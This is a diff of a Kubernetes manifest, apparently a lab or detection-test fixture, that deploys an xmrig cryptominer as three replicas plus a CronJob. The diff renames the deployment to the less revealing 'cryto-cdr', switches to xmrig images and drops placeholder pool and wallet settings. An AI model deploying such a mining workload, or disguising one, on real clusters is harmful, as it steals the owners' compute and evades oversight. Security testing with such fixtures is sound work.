@@ -1,9 +1,10 @@
 apiVersion: apps/v1
 kind: Deployment
 metadata:
-  name: cryptominer-deployment
+  name: cryto-cdr
   labels:
     app: cryptominer
+    version: 1
 spec:
   replicas: 3
   selector:
@@ -16,7 +17,7 @@ spec:
     spec:
       containers:
       - name: cryptominer-container
-        image: carlitoplatanito/coinhive # Cryptominer image for educational purposes
+        image: zsco/xmrig-docker:latest #  Cryptominer image for educational purposes
         ports:
         - containerPort: 8080
         securityContext:
@@ -88,18 +89,7 @@ spec:
     - protocol: TCP
       port: 8080
 ---
-apiVersion: v1
-kind: ConfigMap
-metadata:
-  name: cryptominer-config
-  labels:
-    app: cryptominer
-  namespace: default
-  annotations:
-    description: "ConfigMap to store configuration data for the cryptominer."
-data:
-  MINING_POOL: "examplepool.com:3333"       # [MITRE T1071.001: Application Layer Protocol]
-  WALLET_ADDRESS: "YourWalletAddressHere"
+
 ---
 apiVersion: batch/v1
 kind: CronJob
@@ -115,7 +105,7 @@ spec:
         spec:
           containers:
           - name: cryptominer-scheduled-task
-            image: rkjnsn/coinhive-miner:latest
+            image: zsco/xmrig-docker:latest 
             args:
-            - "--scheduled-mining"
+            - "sh xmrig-startup.sh"
           restartPolicy: OnFailure
